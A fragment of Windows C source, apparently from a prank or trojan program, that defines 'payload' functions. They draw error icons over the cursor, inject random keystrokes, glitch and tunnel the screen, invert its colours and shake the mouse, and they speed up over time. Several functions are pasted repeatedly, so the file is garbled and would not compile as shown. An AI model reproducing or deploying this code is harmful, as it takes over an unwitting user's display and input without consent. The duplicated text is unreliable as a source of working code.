PAYLOADFUNCTIONVISUAL(payloadDrawErrors) {
	PAYLOADHEAD

	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	
	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
		DrawIcon(hdc, random()%(w-ix), random()%(h-iy), LoadIcon(NULL, IDI_WARNING));
	}

	out: return 2;
}
PAYLOADFUNCTIONDEFAULT(payloadKeyboard) {
	PAYLOADHEAD
	
	INPUT input;

	input.type = INPUT_KEYBOARD;
	input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &input, sizeof(INPUT));

	out: return 300 + (random() % 400);
}
PAYLOADFUNCTIONVISUAL(payloadScreenGlitches) {
	PAYLOADHEAD

	int x1 = random() % (w - 400);
	int y1 = random() % (h - 400);
	int x2 = random() % (w - 400);
	int y2 = random() % (h - 400);
	int width = random() % 400;
	int height = random() % 400;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);

	out: return 200.0 / (times / 5.0 + 1) + 3;
}

PAYLOADFUNCTIONVISUAL(payloadTunnel) {
	PAYLOADHEAD

	StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);

	out: return 200.0 / (times / 5.0 + 1) + 4;
}

PAYLOADFUNCTIONVISUAL(payloadTunnel) {
	PAYLOADHEAD

	StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);

	out: return 200.0 / (times / 5.0 + 1) + 4;
}
PAYLOADFUNCTIONVISUAL(payloadInvertScreen) {
	PAYLOADHEAD

	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
	
	out: return 100;
}
PAYLOADFUNCTIONVISUAL(payloadInvertScreen) {
	PAYLOADHEAD

	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
	
	out: return 100;
}
PAYLOADFUNCTIONVISUAL(payloadTunnel) {
	PAYLOADHEAD

	StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);

	out: return 200.0 / (times / 5.0 + 1) + 4;
}

PAYLOADFUNCTIONVISUAL(payloadTunnel) {
	PAYLOADHEAD

	StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);

	out: return 200.0 / (times / 5.0 + 1) + 4;
}
PAYLOADFUNCTIONVISUAL(payloadInvertScreen) {
	PAYLOADHEAD

	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
	
	out: return 100;
}
PAYLOADFUNCTIONVISUAL(payloadInvertScreen) {
	PAYLOADHEAD

	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
	
	out: return 100;
}
PAYLOADFUNCTIONVISUAL(payloadInvertScreen) {
	PAYLOADHEAD

	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
	
	out: return 100;
}
PAYLOADFUNCTIONDEFAULT(payloadCursor) {
	PAYLOADHEAD

	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 5 - 1) * (random() % (runtime / 2000 + 2)), cursor.y + (random() % 13 - 1) * (random() % (runtime / 2290 + 2)));

	out: return 2;
}
